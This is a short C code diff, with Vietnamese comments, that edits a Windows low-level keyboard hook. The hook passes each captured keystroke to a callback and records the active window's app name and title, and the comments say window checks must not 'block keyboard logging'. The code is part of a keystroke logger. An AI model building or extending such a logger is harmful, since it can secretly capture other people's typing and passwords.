@@ -21,14 +21,17 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             
             const char* keyString = vkey_to_string(kbdStruct->vkCode, flags);
             
+            // ƯU TIÊN: Gọi keyboard callback ngay lập tức
             if (g_hookContext->keyboardCallback) {
                 g_hookContext->keyboardCallback(keyString);
             }
         }
         
-        // Kiểm tra thay đổi cửa sổ
+        // Window detection chỉ check nhanh (không block keyboard logging)
+        // Chỉ check window handle thay đổi, không lấy full info mỗi lần
         HWND currentWindow = GetForegroundWindow();
         if (currentWindow != g_hookContext->lastWindow) {
+            // Chỉ lấy full window info khi thực sự thay đổi
             char currentAppName[256] = {0};
             char currentWindowTitle[512] = {0};
             get_active_window_info(currentAppName, sizeof(currentAppName),
